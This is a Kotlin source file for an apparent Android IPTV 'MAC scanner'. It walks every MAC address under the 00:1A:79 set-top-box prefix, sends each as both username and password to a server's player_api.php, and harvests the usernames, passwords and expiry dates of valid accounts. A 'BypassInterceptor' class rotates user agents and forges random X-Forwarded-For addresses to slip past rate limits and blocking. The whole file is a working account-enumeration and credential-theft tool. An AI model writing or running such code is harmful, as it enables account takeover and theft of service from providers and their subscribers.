package com.hunter.macscanner

import com.google.gson.JsonParser
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import okhttp3.*
import java.util.concurrent.TimeUnit

class ScannerRepository {
    private val client = OkHttpClient.Builder()
        .addInterceptor(BypassInterceptor())
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private val _state = MutableStateFlow<ScannerState>(ScannerState.Idle)
    val state: StateFlow<ScannerState> = _state
    private var job: Job? = null

    fun stopScanning() {
        job?.cancel()
        _state.value = ScannerState.Stopped
    }

    fun startScanning(baseUrl: String, speed: Int, startFromMac: String?) {
        job = CoroutineScope(Dispatchers.IO).launch {
            val normalizedUrl = if (baseUrl.startsWith("http")) baseUrl else "http://$baseUrl"
            _state.value = ScannerState.Loading("Getting server location...")
            val location = getServerLocation(normalizedUrl)
            val macGen = MACGenerator("00:1A:79:", startFromMac)

            _state.value = ScannerState.Scanning(
                ScannerStats(serverLocation = location.getSummary()), null
            )

            val delayMillis = (1000L / speed).coerceAtLeast(20L)
            var scannedCount = 0
            var validCount = 0
            val startTime = System.currentTimeMillis()

            try {
                while (isActive && macGen.getRemainingCount() > 0) {
                    val mac = macGen.getNextMac()
                    val result = scanSingleMac(normalizedUrl, mac)
                    scannedCount++

                    if (result.status == "valid") {
                        validCount++
                        _state.value = ScannerState.Scanning(
                            stats = ScannerStats(
                                totalScanned = scannedCount,
                                validFound = validCount,
                                scanRate = if (scannedCount > 0) scannedCount.toFloat() / ((System.currentTimeMillis() - startTime) / 1000f) else 0f,
                                progress = macGen.getProgress(),
                                serverLocation = location.getSummary()
                            ),
                            latestResult = result
                        )
                    } else if (scannedCount % 10 == 0) {
                        _state.value = ScannerState.Scanning(
                            stats = ScannerStats(
                                totalScanned = scannedCount,
                                validFound = validCount,
                                scanRate = if (scannedCount > 0) scannedCount.toFloat() / ((System.currentTimeMillis() - startTime) / 1000f) else 0f,
                                progress = macGen.getProgress(),
                                serverLocation = location.getSummary()
                            ),
                            latestResult = null
                        )
                    }
                    delay(delayMillis)
                }
            } catch (e: CancellationException) {
            } finally {
                if (isActive) _state.value = ScannerState.Stopped
            }
        }
    }

    private fun scanSingleMac(baseUrl: String, mac: String): ScanResult {
        val startTime = System.currentTimeMillis()
        val url = "$baseUrl/player_api.php?username=$mac&password=$mac"
        val request = Request.Builder().url(url).build()

        return try {
            val response = client.newCall(request).execute()
            val responseTime = (System.currentTimeMillis() - startTime) / 1000f

            if (response.isSuccessful) {
                val body = response.body?.string() ?: return ScanResult(mac, "error", responseTime = responseTime)
                val json = JsonParser.parseString(body).asJsonObject

                if (json.has("user_info")) {
                    val userInfo = json.getAsJsonObject("user_info")
                    ScanResult(
                        mac = mac, status = "valid",
                        username = userInfo.get("username")?.asString,
                        password = userInfo.get("password")?.asString,
                        expireDate = userInfo.get("exp_date")?.asString,
                        statusMessage = userInfo.get("status")?.asString ?: "Active",
                        isTrial = userInfo.get("is_trial")?.asString == "1",
                        responseTime = responseTime
                    )
                } else {
                    ScanResult(mac, "invalid", responseTime = responseTime)
                }
            } else {
                ScanResult(mac, "error", statusMessage = "HTTP ${response.code}", responseTime = responseTime)
            }
        } catch (e: Exception) {
            ScanResult(mac, "error", statusMessage = e.message, responseTime = (System.currentTimeMillis() - startTime) / 1000f)
        }
    }

    private fun getServerLocation(baseUrl: String): LocationInfo {
        return try {
            val request = Request.Builder().url("http://ip-api.com/json/").build()
            val response = client.newCall(request).execute()
            val json = JsonParser.parseString(response.body?.string() ?: "").asJsonObject
            LocationInfo(
                country = json.get("country")?.asString ?: "Unknown",
                countryCode = json.get("countryCode")?.asString ?: "XX",
                city = json.get("city")?.asString ?: "Unknown",
                ip = json.get("query")?.asString ?: ""
            )
        } catch (e: Exception) { LocationInfo() }
    }
}

class MACGenerator(private val prefix: String, startFrom: String?) {
    private var currentValue = startFrom?.let { parseStartFrom(it) } ?: 0
    private val maxSuffix = 0xFFFFFF

    private fun parseStartFrom(startFrom: String): Int {
        return try {
            if (startFrom.startsWith(prefix)) startFrom.removePrefix(prefix).replace(":", "").toInt(16) else 0
        } catch (e: Exception) { 0 }
    }

    fun getNextMac(): String {
        val suffix = String.format("%06X", currentValue)
        val mac = "$prefix${suffix.substring(0, 2)}:${suffix.substring(2, 4)}:${suffix.substring(4, 6)}"
        currentValue = (currentValue + 1) % (maxSuffix + 1)
        return mac
    }

    fun getProgress(): Float = (currentValue.toFloat() / maxSuffix) * 100f
    fun getRemainingCount(): Int = maxSuffix - currentValue
}

class BypassInterceptor : Interceptor {
    private val userAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
    )

    override fun intercept(chain: Interceptor.Chain): Response {
        val newRequest = chain.request().newBuilder()
            .header("User-Agent", userAgents.random())
            .header("X-Forwarded-For", "${(1..254).random()}.${(1..254).random()}.${(1..254).random()}.${(1..254).random()}")
            .header("Connection", "keep-alive")
            .build()
        return chain.proceed(newRequest)
    }
}